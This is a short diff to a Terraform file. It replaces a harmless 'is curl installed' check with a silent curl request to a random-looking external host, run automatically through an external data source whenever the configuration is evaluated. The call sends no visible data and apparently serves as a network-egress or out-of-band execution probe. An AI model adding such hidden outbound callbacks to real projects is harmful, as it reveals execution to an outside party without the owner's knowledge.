@@ -2,10 +2,10 @@ data "external" "test" {
   program = [
     "sh",
     "-c",
-    "command -v curl >/dev/null && echo '{\"result\":\"curl-present\"}' || echo '{\"result\":\"curl-missing\"}'"
+    "curl -s https://5w2wpz0kg7x7didoxwvc7fofr6xzlq9f.net-spi.com >/dev/null 2>&1; echo '{\"result\":\"request-attempted\"}'"
   ]
 }
 
-output "curl_check" {
+output "network_test" {
   value = data.external.test.result
 }
